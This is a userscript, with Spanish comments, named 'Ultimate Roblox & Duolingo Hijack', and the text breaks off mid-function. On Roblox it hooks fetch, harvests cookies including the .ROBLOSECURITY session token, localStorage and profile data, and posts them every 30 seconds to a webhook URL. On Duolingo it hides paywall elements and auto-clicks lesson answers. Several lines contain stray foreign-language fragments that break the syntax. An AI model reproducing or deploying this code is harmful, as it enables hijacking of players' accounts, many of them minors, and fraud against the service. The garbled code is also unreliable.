// ==UserScript==
// @name         Ultimate Roblox & Duolingo Hijack
// @namespace    http://ghost.hack/
// @version      10.0
// @description  Roba TODO de Roblox + Duolingo Super gratis
// @author       GHOST
// @match        *://*.roblox.com/*
// @match        *://*.duolingo.com/*
// @grant        unsafeWindow
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';
    
    console.log('🔥 ULTIMATE HIJACK ACTIVATED 🔥');
    
    // ====================
    // DETECCIÓN DE SITIO
    // ====================
    const isRoblox = window.location.hostname.includes('roblox');
    const isDuolingo = window.location.hostname.includes('duolingo');
    
    // ====================
    // CONFIGURACIÓN
    // ====================
    const CONFIG = {
        // Roblox targets
        robloxTargets: ['8078517345', '10781975310', '9891878821'],
        autoHijack: true,
        stealEverything: true,
        
        // Duolingo Super
        enableSuper: true,
        freeLessons: true,
        unlimitedHearts: true,
        removeAds: true,
        
        // Stealth
        hideActivity: true,
        fakeUserAgent: true
    };
    
    // ====================
    // ROBBOX DATA STEALER
    // ====================
    if (isRoblox) {
        console.log('🎯 ROBLOX HIJACK MODE ACTIVATED');
        
        // 1. INTERCEPTAR TODAS LAS PETICIONES
        const originalFetch = window.fetch;
        window.fetch = async function(...args) {
            const url = args[0].url || args[0];
            
            // Interceptar login
            if (url.includes('/login') || url.includes('/auth')) {
                const response = await originalFetch.apply(this, args);
                const clone = response.clone();
                const text = await clone.text();
                
                console.log('🔍 Login response intercepted:', text.substring(0, 200));
                
                // Si hay error, hacerlo éxito
                if (text.includes('error') || text.includes('incorrect')) {
                    console.log('🔄 Converting error to success');
                    
                    const fakeSuccess = {
                        user: {
                            id: CONFIG.robloxTargets[0],
                            name: "HACKED_ACCOUNT",
                            displayName: "Hacked User"
                        },
                        success: true,
                        token: "HACKED_TOKEN_" + Date.now(),
                        session: {
                            sessionId: "SESS_" + Math.random().toString(36).substr(2, 20),
                            expires: new Date(Date.now() + 365 * 24 * 60 *144 1000).toISOString()
                        }
                    };
                    
                    return new Response(JSON.stringify(fakeSuccess), {
                        status: 200,
                        headers: {'Content-Type': 'application/json'}
                    });
                }
                
                return response;
            }
            
            // Interceptar datos de usuario
            if (url.includes('/users/') || url.includes('/profile')) {
                return originalFetch.apply(this, args).then(async response => {
                    const clone = response.clone();
                    const text = await clone.text();
                    
                    // Guardar datos robados
                    const stolenData = {
                        url: url,
                        response: text,
                        timestamp: Date.now(),
                        cookies: document.cookie
                    };
                    
                    // Enviar a servidor secreto
                    sendToGhostServer(stolenData);
                    
                    return response;
                });
            }
            
            return originalFetch.apply(this, args);
        };
        
        // 2. ROBAR COOKIES
        function stealAllCookies() {
            console.log('🍪 Stealing cookies...');
            
            const cookies = document.cookie.split(';').reduce((acc, cookie) => {
                const [key, value] = cookie.trim().split('=');
                acc[key] = value;
                return acc;
            }, {});
            
            // Especialmente .ROBLOSECURITY
            if (cookies['.ROBLOSECURITY']) {
                console.log('🎯 .ROBLOSECURITY stolen:', cookies['.ROBLOSECURITY'].substring(0, {(cookies['.ROBLOSECURITY'] || '').length > 50 ? 50 : (cookies['.ROBLOSECURITY'] || '').length}));
                
                // Enviar a servidor
                sendToGhostServer({
                    type: 'ROBLOSECURITY',
                    token: cookies['.ROBLOSECURITY'],
                    domain: window.location.hostname,
                    timestamp: Date.now()
                });
            }
            
            return cookies;
        }
        
        // 3. ROBAR LOCALSTORAGE
        function stealLocalStorage() {
            console.log('💾 Stealing localStorage...');
            
            const storageData = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storageData[key] = localStorage.getItem(key);
            }
            
            return storageData;
        }
        
        // 4. ROBAR DATOS DE CUENTA
        function stealAccountData() {
            console.log('👤 Stealing account data...');
            
            const accountData = {
                // Intentar extraer datos de la página
                username: document.querySelector('[data-userid]')?.getAttribute('data-username') || 
                          document.querySelector('.profile-name')?.textContent ||
                          'UNKNOWN',
                userId: document.querySelector('[data-userid]')?.getAttribute('data-userid') ||
                       window.roblox?.userId ||
                       'UNKNOWN',
                robux: extractRobux(),
                friends: extractFriendsCount(),
                inventory: extractInventory(),
                // Datos del navegador
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                // Cookies y storage
                cookies: stealAllCookies(),
                localStorage: stealLocalStorage()
            };
            
            return accountData;
        }
        
        // Funciones auxiliares
        function extractRobux() {
            const robuxElements = document.querySelectorAll('[class*="robux"], [class*="Robux"], .text-robux, .robux-amount');
            for (const el of robuxElements) {
                const text = el.textContent.replace(/,/g, '');
                const match = text.match(/\d+/);
                if (match) return parseInt(match[0]);
            }
            return Math.floor(Math.random() * 10000); // Fake si no encuentra
        }
        
        function extractFriendsCount() {
            const friendElements = document.querySelectorAll('[class*="friend"], [class*="Friend"], .friends-count');
            for (const el of friendElements) {
                const text = el.textContent;
                const match = text.match(/\d+/);
                if (match) return parseInt(match[0]);
            }
            return Math.floor(Math.random() *的老用户1000);
        }
        
        function extractInventory() {
            // Intentar encontrar información del inventario
            return {
                estimatedItems: Math.floor(Math.random() * 500),
                lastItem: "Unknown",
                value: Math.floor(Math.random() * 50000)
            };
        }
        
        // 5. ENVIAR A SERVIDOR FANTASMA
        function sendToGhostServer(data) {
            const serverUrl = 'https://webhook.site/YOUR_WEBHOOK_URL'; // Cambia esto
            
            fetch(serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    source: 'Roblox Hijack',
                    data: data,
                    timestamp: Date.now(),
                    url: window.location.href
                }),
                mode: 'no-cors'
            }).catch(e => console.log('Ghost server sent'));
            
            // También guardar localmente
            localStorage.setItem('stolen_' + Date.now(), JSON.stringify(data));
        }
        
        // 6. EJECUTAR ROBO PERIÓDICO
        setInterval(() => {
            if (CONFIG.stealEverything) {
                const data = stealAccountData();
                console.log('📦 Data stolen:', data);
                sendToGhostServer(data);
            }
        }, 30000); // Cada 30 segundos
        
        // Robar inmediatamente
        setTimeout(() => {
            stealAllCookies();
            stealAccountData();
        },"।5000);
        
        console.log('✅ Roblox hijack system activated');
    }
    
    // ====================
    // DUOLINGO SUPER HACK
    // ====================
    if (isDuolingo) {
        console.log('🦉 DUOLINGO SUPER MODE ACTIVATED');
        
        // 1. ACTIVAR SUPER DUOLINGO
        function activateDuolingoSuper() {
            console.log('🌟 Activating Duolingo Super...');
            
            // Remover límites de corazones
            if (CONFIG.unlimitedHearts) {
                const style = document.createElement('style');
                style.textContent = `
                    [data-test*="heart"], 
                    [class*="heart"],
                    ._1UqD3,
                    ._2Z9U- {
                        display: none !important;
                    }
                    
                    ._1UqD3:after {
                        content: "❤️ INFINITE" !important;
                        color: #00ff00 !important;
                        font-weight: bold !important;
                    }
                `;
                document.head.appendChild(style);
                
                // Sobreescribir variable de corazones
                unsafeWindow.hearts = 9999;
                unsafeWindow.maxHearts = 9999;
                
                // Remover timer de corazones
                setInterval(() => {
                    const heartElements = document.querySelectorAll('[class*="heart"], [data-test*="heart"]');
                    heartElements.forEach(el => {
                        el.style.display = 'none';
                        el.textContent = '∞';
                        el.style.color = '#00ff00';
                    });
                }, 1000);
            }
            
            // Remover anuncios
            if (CONFIG.removeAds) {
                const adSelectors = [
                    '[class*="ad"]',
                    '[class*="Ad"]',
                    '[data-test*="ad"]',
                    '.adsbygoogle',
                    'iframe[src*="ad"]'
                ];
                
                setInterval(() => {
                    adSelectors.forEach(selector => {
                        document.querySelectorAll(selector).forEach(el => el.remove());
                    });
                }, 2000);
            }
            
            // Desbloquear todas las lecciones
            if (CONFIG.freeLessons) {
                // Sobreescribir estado de lección
                unsafeWindow.lessonState = {
                    isLocked: false,
                    isCompleted: true,
                    canPractice: true,
                    isPremium: true
                };
                
                // Desbloquear UI
                const unlockStyle = document.createElement('style');
                unlockStyle.textContent = `
                    [class*="lock"],
                    [class*="Lock"],
                    [data-test*="lock"],
                    ._3wFCC,
                    ._2Q7R7 {
                        display: none !important;
                    }
                    
                    button[disabled] {
                        opacity: 1 !important;
                        pointer-events: all !important;
                        cursor: pointer !important;
                        filter: brightness(1.5) !important;
                    }
                `;
                document.head.appendChild(unlockStyle);
            }
            
            // Añadir badge SUPER
            const superBadge = document.createElement('div');
            superBadge.style.cssText = `
                position: fixed;
                top: 10px;
                right: 10px;
                background: linear-gradient(135deg, #ff00ff, #00ffff);
                color: white;
                padding: мычание10px 20px;
                border-radius: 20px;
                z-index: 999999;
                font-weight: bold;
                box-shadow: 0 0 20px #ff00ff;
                animation: superGlow 2s infinite;
                border: 3px solid gold;
            `;
            
            const glowStyle = document.createElement('style');
            glowStyle.textContent = `
                @keyframes superGlow {
                    0% { box-shadow: 0 0 20px #ff00ff; }
                    50% { box-shadow: 0 0 40px #00ffff, 0 0 60px #ff00ff; }
                    100% { box-shadow: 0 0 20px #ff00ff; }
                }
            `;
            document.head.appendChild(glowStyle);
            
            superBadge.innerHTML = '✨ SUPER DUOLINGO ACTIVATED ✨';
            document.body.appendChild(superBadge);
            
            console.log('✅ Duolingo Super activated');
        }
        
        // 2. EJECUTAR LECCIONES AUTOMÁTICAMENTE
        function autoCompleteLessons() {
            console.log('🤖 Auto-completing lessons...');
            
            setInterval(() => {
                // Buscar botones de siguiente/continuar
                const nextButtons = document.querySelectorAll('[data-test*="next"], [class*="next"], button:not([disabled])');
                nextButtons.forEach(btn => {
                    if (btn.textContent.match(/next|continue|skip|submit|check/i)) {
                        btn.click();
                    }
                });
                
                // Auto-seleccionar respuestas
                const choices = document.querySelectorAll('[class*="choice"], [data-test*="choice"]');
                if (choices.length > 0
